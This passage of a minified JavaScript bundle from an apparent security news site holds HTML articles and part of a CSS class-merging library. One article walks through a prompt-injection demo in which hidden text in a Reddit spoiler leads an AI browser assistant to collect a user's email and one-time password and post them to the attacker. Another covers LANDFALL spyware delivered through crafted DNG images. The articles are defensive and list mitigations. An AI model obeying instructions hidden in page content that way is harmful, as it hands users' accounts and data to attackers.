        <h3 style="color:#fd113e;">Final Thoughts</h3><br>
        <p style="color:#f8dde3; line-height:1.6;">
          AI assistants are powerful — but they also blur the lines between <em>what you asked</em> and <em>what the page told them to do</em>. Until browsers implement strong isolation layers that separate user intent from page content, treat AI browser features like any other privileged tool: limit their reach, reduce automatic access, and assume attackers will try to weaponize convenience.
        </p>
        <p style="margin-top:10px; color:#ff4c64; font-style:italic;">Who's thinking for your browser? Make sure it's you.</p>
      </section>
  </div>
`},{id:"ai-browser-indirect-prompt-injection-2025",title:"The Invisible Hack — Indirect Prompt Injection Targets AI Browsers",summary:"Brave demo shows how hidden prompts in web content can trick AI-powered browsers to exfiltrate logged-in data. One click is all it takes.",date:"2025-11-05",author:"EthicalByte",tags:["AI Browser","Prompt Injection","Brave","Comet","Security","Browser Threats"],imageKey:"aiBrowserBlackWidowBanner",content:`
  <div style="font-family:'Inter',sans-serif; background:linear-gradient(145deg,#080808 0%,#17131a 100%); color:#f4e7eb; padding:24px; border-radius:12px; box-shadow:0 6px 30px rgba(255,60,80,0.13);">

    <div style="text-align:center;">
      <h3 style="color:#e4002b; text-shadow:0 1px 6px #0c070a;">The Invisible Hack</h3><br>
      <p style="color:#dfccd5; max-width:880px; margin:0 auto;">
        Security researchers at <strong style="color:#ff4252;">Brave</strong> revealed a critical weakness in AI-powered browsers: attackers can hide instructions in web content (white-on-white text, HTML comments, spoilers, screenshots) that an assistant will obediently execute. When the assistant runs with your signed-in privileges, a single click can hand an attacker emails, one-time passwords, and full account access.
      </p>
    </div>

    <section style="margin-top:20px; padding:18px; background:#140d13; border-radius:10px;">
      <h3 style="color:#fd113e;">What’s Happening?</h3><br>
      <p style="color:#f6cad4; line-height:1.6;">
        Attackers embed <strong style="color:#fd113e;">hidden prompts</strong> in page content — invisible text, comments, spoiler tags, or nearly-invisible overlays. AI assistants (like Comet in the Brave demo) can't reliably separate <em>user intent</em> from <em>page content</em>, so they execute both. The result: data exfiltration using the user’s own authenticated sessions.
      </p>
    </section>

    <section style="margin-top:18px; padding:18px; background:linear-gradient(90deg,#1b0c13,#26141f); border-radius:10px;">
      <h3 style="color:#fd113e;">How the Exploit Worked (Demo)</h3><br>
      <ul style="color:#fae3e3; line-height:1.7; margin-left:20px;">
        <li>Hidden payload in a Reddit spoiler — triggered by “Summarize this comment”.</li>
        <li>Assistant logged into Perplexity to record the user email.</li>
        <li>Assistant opened Gmail (user already authenticated) and grabbed an OTP.</li>
        <li>Assistant posted email + OTP back to the attacker’s comment — full account takeover with one click.</li>
      </ul>
      <p style="color:#ecd0d6;">No phishing link. No classic malware. Just a trust boundary collapse between page content and assistant commands.</p>
    </section>

    <section style="margin-top:18px; padding:18px; background:#130f14; border-radius:10px;">
      <h3 style="color:#fd113e;">Why This Is Terrifying</h3><br>
      <p style="color:#f2c6cb; line-height:1.6;">
        AI browsers often act with the same session privileges as you. If you’re logged into email, bank, or work apps, the assistant’s actions inherit those privileges — meaning hidden instructions can access sensitive assets without human consent.
      </p>
      <p style="color:#a08a94;">Some browsers auto-send page content to the AI engine (background summarization). That behavior removes even the “click” requirement — visiting a malicious page might be enough.</p>
    </section>

    <section style="margin-top:18px; padding:18px; background:linear-gradient(90deg,#200b13,#28202b); border-radius:10px;">
      <h3 style="color:#fd113e;">Attack Surface & Tech Notes</h3><br>
      <ul style="color:#ffd0da; line-height:1.7; margin-left:20px;">
        <li>Hidden text layers and HTML comments are simple carriers for malicious prompts.</li>
        <li>Screenshots with near-invisible text (steganographic overlays) can embed instructions.</li>
        <li>Auto-ingestion (background fetch → model prompt) drastically widens the attack surface.</li>
        <li>Mitigations require both UI/UX isolation and server-side policy enforcement from browser vendors.</li>
      </ul>
    </section>

    <section style="margin-top:18px; padding:18px; background:#18111a; border-radius:10px;">
      <h3 style="color:#fd113e;">Immediate Mitigations (For Users & Admins)</h3><br>
      <ul style="color:#f8dde3; line-height:1.7; margin-left:20px;">
        <li>Disable AI summarization or assistant features while logged into sensitive accounts.</li>
        <li>Use separate browser profiles for sensitive work (no third-party AI features in that profile).</li>
        <li>Turn off auto-send/background content processing for AI features.</li>
        <li>Enforce strict CSPs and sanitize third-party content in corporate web apps.</li>
        <li>Monitor for unusual token reuse, rapid OTP requests, and anomalous API calls.</li>
      </ul>
    </section>

    <section style="margin-top:18px; padding:20px; text-align:center; background:linear-gradient(180deg,#191217,#25171b); border-radius:10px; border:1px solid rgba(253,17,62,0.10);">
      <h3 style="color:#fd113e;">Final Thoughts</h3><br>
      <p style="color:#f8dde3; line-height:1.6;">
        AI assistants are powerful — but they also blur the lines between <em>what you asked</em> and <em>what the page told them to do</em>. Until browsers implement strong isolation layers that separate user intent from page content, treat AI browser features like any other privileged tool: limit their reach, reduce automatic access, and assume attackers will try to weaponize convenience.
      </p>
      <p style="margin-top:10px; color:#ff4c64; font-style:italic;">Who’s thinking for your browser? Make sure it’s you.</p>
    </section>

  </div>
  `},{id:"samsung-landfall-spyware-2025",title:"LANDFALL Spyware Hits Samsung Phones — Trusted Devices Turn System-Wide Threat",subtitle:"A zero-day in Samsung’s image-processing library let LANDFALL infiltrate Galaxy models and run persistent surveillance.",date:"2025-11-08",author:"EthicalByte",tags:["Samsung","LANDFALL","Spyware","Android Security","Zero-Day","Mobile Threat"],imageKey:"samsungLandfallBanner2025",content:`
<section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#0b3d91,#081b3c); border-radius:12px; color:#ffffff;">
  <div style="display:inline-flex;align-items:center;gap:8px;padding:6px 10px;border-radius:999px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);">
    <div style="background:#c62828;color:#fff;padding:4px 6px;border-radius:6px;font-weight:700">★</div>
    <div style="font-size:0.95rem">EthicalByte • Threat Brief</div>
  </div>

  <h3 style="color:#ffffff; margin-top:12px;">🚨 LANDFALL Spyware Penetrates Samsung Galaxy Phones</h3>

  <p style="color:#d9e7ff; margin-top:8px;">
    Security researchers discovered a sophisticated campaign targeting Samsung Galaxy devices via a zero-day vulnerability in the manufacturer’s image-processing library. The spyware — dubbed 
    <strong style="color:#c62828;">LANDFALL</strong> — exploited this flaw to silently infiltrate phones, deploy keylogging, audio recording and full data exfiltration modules.
  </p>
</section>


<section style="padding:18px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#071029,#0b1324); border-radius:12px; color:#d9e7ff; margin-top:15px;">
  <h3 style="color:#dbe9ff;">📌 How the Attack Worked</h3>

  <ul style="margin-left:20px; line-height:1.6; color:#d9e7ff;">
    <li><strong>Malicious DNG image files:</strong> Crafted DNG files (disguised as JPEGs) were delivered via messaging apps and exploited CVE-2025-21042.</li>
    <li><strong>Silent execution:</strong> Opening the media triggered the image library exploit, executing payloads and installing spyware with no user interaction.</li>
    <li><strong>Wide device coverage:</strong> Impacted devices include Galaxy S22, S23, S24 and Z-series models across targeted regions.</li>
  </ul>
</section>


<section style="padding:18px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#081a2a,#0b1830); border-radius:12px; color:#d9e7ff; margin-top:15px; border-left:6px solid #c62828;">
  <h3 style="color:#dbe9ff;">⚠️ Why This Is Dangerous</h3>

  <p style="margin-top:8px;">
    Devices are trusted platforms; when a low-level image-processing component is compromised, attackers gain a stealthy, persistent foothold. LANDFALL enabled continuous surveillance — capturing credentials, sensor feeds, location, microphone and more.
  </p>

  <p style="margin-top:8px; color:#cfe3ff;">
    The campaign ran silently for months (mid-2024 to early-2025) before being publicly exposed.
  </p>
</section>


<section style="padding:18px; font-family:Arial, sans-serif; background:#ffffff; border-radius:12px; color:#0b2346; margin-top:15px; border:1px solid rgba(11,37,70,0.08);">
  <h3 style="color:#0b3d91; margin-top:0;">🛡 What You Can Do</h3>

  <ul style="margin-left:20px; line-height:1.6; color:#0b2346;">
    <li>Install the latest Samsung software update immediately.</li>
    <li>Avoid opening unexpected image files or APKs received through messaging apps.</li>
    <li>Enable encryption + strong screen lock (PIN/biometric).</li>
    <li>Use mobile threat protection if available.</li>
    <li>Review app permissions (camera, mic, storage, location).</li>
  </ul>

  <div style="margin-top:10px;">
    <a href="#" style="display:inline-block;padding:10px 14px;border-radius:10px;background:#c62828;color:#ffffff;text-decoration:none;font-weight:600;">Quick Checklist</a>
  </div>
</section>


<section style="padding:18px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#06122a,#081228); border-radius:12px; color:#d9e7ff; margin-top:15px; text-align:center;">
  <h3 style="color:#dbe9ff; margin-top:0;">📢 Final Thoughts</h3>

  <p style="margin:8px 0 0;">
    Modern smartphones are full computing platforms — every subsystem (even image libraries) must be treated as an attack surface. Stay updated, stay cautious, and never trust unsolicited media.
  </p>
</section>
  `}],G1=n=>Pd.find(t=>t.id===n);function Km(n){var t,r,s="";if(typeof n=="string"||typeof n=="number")s+=n;else if(typeof n=="object")if(Array.isArray(n)){var a=n.length;for(t=0;t<a;t++)n[t]&&(r=Km(n[t]))&&(s&&(s+=" "),s+=r)}else for(r in n)n[r]&&(s&&(s+=" "),s+=r);return s}function Ed(){for(var n,t,r=0,s="",a=arguments.length;r<a;r++)(n=arguments[r])&&(t=Km(n))&&(s&&(s+=" "),s+=t);return s}function q1(){for(var n=0,t,r,s="";n<arguments.length;)(t=arguments[n++])&&(r=Jm(t))&&(s&&(s+=" "),s+=r);return s}function Jm(n){if(typeof n=="string")return n;for(var t,r="",s=0;s<n.length;s++)n[s]&&(t=Jm(n[s]))&&(r&&(r+=" "),r+=t);return r}var Id="-";function K1(n){var t=Q1(n),r=n.conflictingClassGroups,s=n.conflictingClassGroupModifiers,a=s===void 0?{}:s;function c(h){var p=h.split(Id);return p[0]===""&&p.length!==1&&p.shift(),Qm(p,t)||J1(h)}function d(h,p){var f=r[h]||[];return p&&a[h]?[].concat(f,a[h]):f}return{getClassGroupId:c,getConflictingClassGroupIds:d}}function Qm(n,t){if(n.length===0)return t.classGroupId;var r=n[0],s=t.nextPart.get(r),a=s?Qm(n.slice(1),s):void 0;if(a)return a;if(t.validators.length!==0){var c=n.join(Id);return t.validators.find(function(d){var h=d.validator;return h(c)})?.classGroupId}}var Kf=/^\[(.+)\]$/;function J1(n){if(Kf.test(n)){var t=Kf.exec(n)[1],r=t?.substring(0,t.indexOf(":"));if(r)return"arbitrary.."+r}}function Q1(n){var t=n.theme,r=n.prefix,s={nextPart:new Map,validators:[]},a=X1(Object.entries(n.classGroups),r);return a.forEach(function(c){var d=c[0],h=c[1];qc(h,s,d,t)}),s}function qc(n,t,r,s){n.forEach(function(a){if(typeof a=="string"){var c=a===""?t:Jf(t,a);c.classGroupId=r;return}if(typeof a=="function"){if(Y1(a)){qc(a(s),t,r,s);return}t.validators.push({validator:a,classGroupId:r});return}Object.entries(a).forEach(function(d){var h=d[0],p=d[1];qc(p,Jf(t,h),r,s)})})}function Jf(n,t){var r=n;return t.split(Id).forEach(function(s){r.nextPart.has(s)||r.nextPart.set(s,{nextPart:new Map,validators:[]}),r=r.nextPart.get(s)}),r}function Y1(n){return n.isThemeGetter}function X1(n,t){return t?n.map(function(r){var s=r[0],a=r[1],c=a.map(function(d){return typeof d=="string"?t+d:typeof d=="object"?Object.fromEntries(Object.entries(d).map(function(h){var p=h[0],f=h[1];return[t+p,f]})):d});return[s,c]}):n}function Z1(n){if(n<1)return{get:function(){},set:function(){}};var t=0,r=new Map,s=new Map;function a(c,d){r.set(c,d),t++,t>n&&(t=0,s=r,r=new Map)}return{get:function(d){var h=r.get(d);if(h!==void 0)return h;if((h=s.get(d))!==void 0)return a(d,h),h},set:function(d,h){r.has(d)?r.set(d,h):a(d,h)}}}var Ym="!";function e2(n){var t=n.separator||":",r=t.length===1,s=t[0],a=t.length;return function(d){for(var h=[],p=0,f=0,m,y=0;y<d.length;y++){var v=d[y];if(p===0){if(v===s&&(r||d.slice(y,y+a)===t)){h.push(d.slice(f,y)),f=y+a;continue}if(v==="/"){m=y;continue}}v==="["?p++:v==="]"&&p--}var w=h.length===0?d:d.substring(f),E=w.startsWith(Ym),T=E?w.substring(1):w,C=m&&m>f?m-f:void 0;return{modifiers:h,hasImportantModifier:E,baseClassName:T,maybePostfixModifierPosition:C}}}function t2(n){if(n.length<=1)return n;var t=[],r=[];return n.forEach(function(s){var a=s[0]==="[";a?(t.push.apply(t,r.sort().concat([s])),r=[]):r.push(s)}),t.push.apply(t,r.sort()),t}function i2(n){return{cache:Z1(n.cacheSize),splitModifiers:e2(n),...K1(n)}}var n2=/\s+/;function r2(n,t){var r=t.splitModifiers,s=t.getClassGroupId,a=t.getConflictingClassGroupIds,c=new Set;return n.trim().split(n2).map(function(d){var h=r(d),p=h.modifiers,f=h.hasImportantModifier,m=h.baseClassName,y=h.maybePostfixModifierPosition,v=s(y?m.substring(0,y):m),w=!!y;if(!v){if(!y)return{isTailwindClass:!1,originalClassName:d};if(v=s(m),!v)return{isTailwindClass:!1,originalClassName:d};w=!1}var E=t2(p).join(":"),T=f?E+Ym:E;return{isTailwindClass:!0,modifierId:T,classGroupId:v,originalClassName:d,hasPostfixModifier:w}}).reverse().filter(function(d){if(!d.isTailwindClass)return!0;var h=d.modifierId,p=d.classGroupId,f=d.hasPostfixModifier,m=h+p;return c.has(m)?!1:(c.add(m),a(p,f).forEach(function(y){return c.add(h+y)}),!0)}).reverse().map(function(d){return d.originalClassName}).join(" ")}function s2(){for(var n=arguments.length,t=new Array(n),r=0;r<n;r++)t[r]=arguments[r];var s,a,c,d=h;function h(f){var m=t[0],y=t.slice(1),v=y.reduce(function(w,E){return E(w)},m());return s=i2(v),a=s.cache.get,c=s.cache.set,d=p,p(f)}function p(f){var m=a(f);if(m)return m;var y=r2(f,s);return c(f,y),y}return function(){return d(q1.apply(null,arguments))}}function Me(n){var t=function(s){return s[n]||[]};return t.isThemeGetter=!0,t}var Xm=/^\[(?:([a-z-]+):)?(.+)\]$/i,o2=/^\d+\/\d+$/,a2=new Set(["px","full","screen"]),l2=/^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/,c2=/\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/,d2=/^-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/;function Vt(n){return dn(n)||a2.has(n)||o2.test(n)||Kc(n)}function Kc(n){return mn(n,"length",m2)}function u2(n){return mn(n,"size",Zm)}function h2(n){return mn(n,"position",Zm)}function p2(n){return mn(n,"url",y2)}function Do(n){return mn(n,"number",dn)}function dn(n){return!Number.isNaN(Number(n))}function f2(n){return n.endsWith("%")&&dn(n.slice(0,-1))}function Kr(n){return Qf(n)||mn(n,"number",Qf)}function me(n){return Xm.test(n)}function Jr(){return!0}function Ri(n){return l2.test(n)}function g2(n){return mn(n,"",b2)}function mn(n,t,r){var s=Xm.exec(n);return s?s[1]?s[1]===t:r(s[2]):!1}function m2(n){return c2.test(n)}function Zm(){return!1}function y2(n){return n.startsWith("url(")}function Qf(n){return Number.isInteger(Number(n))}function b2(n){return d2.test(n)}function v2(){var n=Me("colors"),t=Me("spacing"),r=Me("blur"),s=Me("brightness"),a=Me("borderColor"),c=Me("borderRadius"),d=Me("borderSpacing"),h=Me("borderWidth"),p=Me("contrast"),f=Me("grayscale"),m=Me("hueRotate"),y=Me("invert"),v=Me("gap"),w=Me("gradientColorStops"),E=Me("gradientColorStopPositions"),T=Me("inset"),C=Me("margin"),O=Me("opacity"),R=Me("padding"),M=Me("saturate"),L=Me("scale"),W=Me("sepia"),J=Me("skew"),G=Me("space"),X=Me("translate"),ne=function(){return["auto","contain","none"]},ge=function(){return["auto","hidden","clip","visible","scroll"]},Ae=function(){return["auto",me,t]},H=function(){return[me,t]},ae=function(){return["",Vt]},$=function(){return["auto",dn,me]},he=function(){return["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"]},oe=function(){return["solid","dashed","dotted","double","none"]},ue=function(){return["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity","plus-lighter"]},V=function(){return["start","end","center","between","around","evenly","stretch"]},Q=function(){return["","0",me]},q=function(){return["auto","avoid","all","avoid-page","page","left","right","column"]},P=function(){return[dn,Do]},B=function(){return[dn,me]};return{cacheSize:500,theme:{colors:[Jr],spacing:[Vt],blur:["none","",Ri,me],brightness:P(),borderColor:[n],borderRadius:["none","","full",Ri,me],borderSpacing:H(),borderWidth:ae(),contrast:P(),grayscale:Q(),hueRotate:B(),invert:Q(),gap:H(),gradientColorStops:[n],gradientColorStopPositions:[f2,Kc],inset:Ae(),margin:Ae(),opacity:P(),padding:H(),saturate:P(),scale:P(),sepia:Q(),skew:B(),space:H(),translate:H()},classGroups:{aspect:[{aspect:["auto","square","video",me]}],container:["container"],columns:[{columns:[Ri]}],"break-after":[{"break-after":q()}],"break-before":[{"break-before":q()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none"]}],clear:[{clear:["left","right","both","none"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[].concat(he(),[me])}],overflow:[{overflow:ge()}],"overflow-x":[{"overflow-x":ge()}],"overflow-y":[{"overflow-y":ge()}],overscroll:[{overscroll:ne()}],"overscroll-x":[{"overscroll-x":ne()}],"overscroll-y":[{"overscroll-y":ne()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[T]}],"inset-x":[{"inset-x":[T]}],"inset-y":[{"inset-y":[T]}],start:[{start:[T]}],end:[{end:[T]}],top:[{top:[T]}],right:[{right:[T]}],bottom:[{bottom:[T]}],left:[{left:[T]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",Kr]}],basis:[{basis:Ae()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",me]}],grow:[{grow:Q()}],shrink:[{shrink:Q()}],order:[{order:["first","last","none",Kr]}],"grid-cols":[{"grid-cols":[Jr]}],"col-start-end":[{col:["auto",{span:["full",Kr]},me]}],"col-start":[{"col-start":$()}],"col-end":[{"col-end":$()}],"grid-rows":[{"grid-rows":[Jr]}],"row-start-end":[{row:["auto",{span:[Kr]},me]}],"row-start":[{"row-start":$()}],"row-end":[{"row-end":$()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",me]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",me]}],gap:[{gap:[v]}],"gap-x":[{"gap-x":[v]}],"gap-y":[{"gap-y":[v]}],"justify-content":[{justify:["normal"].concat(V())}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal"].concat(V(),["baseline"])}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[].concat(V(),["baseline"])}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[R]}],px:[{px:[R]}],py:[{py:[R]}],ps:[{ps:[R]}],pe:[{pe:[R]}],pt:[{pt:[R]}],pr:[{pr:[R]}],pb:[{pb:[R]}],pl:[{pl:[R]}],m:[{m:[C]}],mx:[{mx:[C]}],my:[{my:[C]}],ms:[{ms:[C]}],me:[{me:[C]}],mt:[{mt:[C]}],mr:[{mr:[C]}],mb:[{mb:[C]}],ml:[{ml:[C]}],"space-x":[{"space-x":[G]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[G]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit",me,t]}],"min-w":[{"min-w":["min","max","fit",me,Vt]}],"max-w":[{"max-w":["0","none","full","min","max","fit","prose",{screen:[Ri]},Ri,me]}],h:[{h:[me,t,"auto","min","max","fit"]}],"min-h":[{"min-h":["min","max","fit",me,Vt]}],"max-h":[{"max-h":[me,t,"min","max","fit"]}],"font-size":[{text:["base",Ri,Kc]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Do]}],"font-family":[{font:[Jr]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",me]}],"line-clamp":[{"line-clamp":["none",dn,Do]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",me,Vt]}],"list-image":[{"list-image":["none",me]}],"list-style-type":[{list:["none","disc","decimal",me]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[n]}],"placeholder-opacity":[{"placeholder-opacity":[O]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[n]}],"text-opacity":[{"text-opacity":[O]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[].concat(oe(),["wavy"])}],"text-decoration-thickness":[{decoration:["auto","from-font",Vt]}],"underline-offset":[{"underline-offset":["auto",me,Vt]}],"text-decoration-color":[{decoration:[n]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],indent:[{indent:H()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",me]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",me]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[O]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[].concat(he(),[h2])}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",u2]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},p2]}],"bg-color":[{bg:[n]}],"gradient-from-pos":[{from:[E]}],"gradient-via-pos":[{via:[E]}],"gradient-to-pos":[{to:[E]}],"gradient-from":[{from:[w]}],"gradient-via":[{via:[w]}],"gradient-to":[{to:[w]}],rounded:[{rounded:[c]}],"rounded-s":[{"rounded-s":[c]}],"rounded-e":[{"rounded-e":[c]}],"rounded-t":[{"rounded-t":[c]}],"rounded-r":[{"rounded-r":[c]}],"rounded-b":[{"rounded-b":[c]}],"rounded-l":[{"rounded-l":[c]}],"rounded-ss":[{"rounded-ss":[c]}],"rounded-se":[{"rounded-se":[c]}],"rounded-ee":[{"rounded-ee":[c]}],"rounded-es":[{"rounded-es":[c]}],"rounded-tl":[{"rounded-tl":[c]}],"rounded-tr":[{"rounded-tr":[c]}],"rounded-br":[{"rounded-br":[c]}],"rounded-bl":[{"rounded-bl":[c]}],"border-w":[{border:[h]}],"border-w-x":[{"border-x":[h]}],"border-w-y":[{"border-y":[h]}],"border-w-s":[{"border-s":[h]}],"border-w-e":[{"border-e":[h]}],"border-w-t":[{"border-t":[h]}],"border-w-r":[{"border-r":[h]}],"border-w-b":[{"border-b":[h]}],"border-w-l":[{"border-l":[h]}],"border-opacity":[{"border-opacity":[O]}],"border-style":[{border:[].concat(oe(),["hidden"])}],"divide-x":[{"divide-x":[h]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[h]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[O]}],"divide-style":[{divide:oe()}],"border-color":[{border:[a]}],"border-color-x":[{"border-x":[a]}],"border-color-y":[{"border-y":[a]}],"border-color-t":[{"border-t":[a]}],"border-color-r":[{"border-r":[a]}],"border-color-b":[{"border-b":[a]}],"border-color-l":[{"border-l":[a]}],"divide-color":[{divide:[a]}],"outline-style":[{outline:[""].concat(oe())}],"outline-offset":[{"outline-offset":[me,Vt]}],"outline-w":[{outline:[Vt]}],"outline-color":[{outline:[n]}],"ring-w":[{ring:ae()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[n]}],"ring-opacity":[{"ring-opacity":[O]}],"ring-offset-w":[{"ring-offset":[Vt]}],"ring-offset-color":[{"ring-offset":[n]}],shadow:[{shadow:["","inner","none",Ri,g2]}],"shadow-color":[{shadow:[Jr]}],opacity:[{opacity:[O]}],"mix-blend":[{"mix-blend":ue()}],"bg-blend":[{"bg-blend":ue()}],filter:[{filter:["","none"]}],blur:[{blur:[r]}],brightness:[{brightness:[s]}],contrast:[{contrast:[p]}],"drop-shadow":[{"drop-shadow":["","none",Ri,me]}],grayscale:[{grayscale:[f]}],"hue-rotate":[{"hue-rotate":[m]}],invert:[{invert:[y]}],saturate:[{saturate:[M]}],sepia:[{sepia:[W]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[r]}],"backdrop-brightness":[{"backdrop-brightness":[s]}],"backdrop-contrast":[{"backdrop-contrast":[p]}],"backdrop-grayscale":[{"backdrop-grayscale":[f]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[m]}],"backdrop-invert":[{"backdrop-invert":[y]}],"backdrop-opacity":[{"backdrop-opacity":[O]}],"backdrop-saturate":[{"backdrop-saturate":[M]}],"backdrop-sepia":[{"backdrop-sepia":[W]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[d]}],"border-spacing-x":[{"border-spacing-x":[d]}],"border-spacing-y":[{"border-spacing-y":[d]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",me]}],duration:[{duration:B()}],ease:[{ease:["linear","in","out","in-out",me]}],delay:[{delay:B()}],animate:[{animate:["none","spin","ping","pulse","bounce",me]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[L]}],"scale-x":[{"scale-x":[L]}],"scale-y":[{"scale-y":[L]}],rotate:[{rotate:[Kr,me]}],"translate-x":[{"translate-x":[X]}],"translate-y":[{"translate-y":[X]}],"skew-x":[{"skew-x":[J]}],"skew-y":[{"skew-y":[J]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",me]}],accent:[{accent:["auto",n]}],appearance:["appearance-none"],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",me]}],"caret-color":[{caret:[n]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":H()}],"scroll-mx":[{"scroll-mx":H()}],"scroll-my":[{"scroll-my":H()}],"scroll-ms":[{"scroll-ms":H()}],"scroll-me":[{"scroll-me":H()}],"scroll-mt":[{"scroll-mt":H()}],"scroll-mr":[{"scroll-mr":H()}],"scroll-mb":[{"scroll-mb":H()}],"scroll-ml":[{"scroll-ml":H()}],"scroll-p":[{"scroll-p":H()}],"scroll-px":[{"scroll-px":H()}],"scroll-py":[{"scroll-py":H()}],"scroll-ps":[{"scroll-ps":H()}],"scroll-pe":[{"scroll-pe":H()}],"scroll-pt":[{"scroll-pt":H()}],"scroll-pr":[{"scroll-pr":H()}],"scroll-pb":[{"scroll-pb":H()}],"scroll-pl":[{"scroll-pl":H()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","pinch-zoom","manipulation",{pan:["x","left","right","y","up","down"]}]}],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",me]}],fill:[{fill:[n,"none"]}],"stroke-w":[{stroke:[Vt,Do]}],stroke:[{stroke:[n,"none"]}],sr:["sr-only","not-sr-only"]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-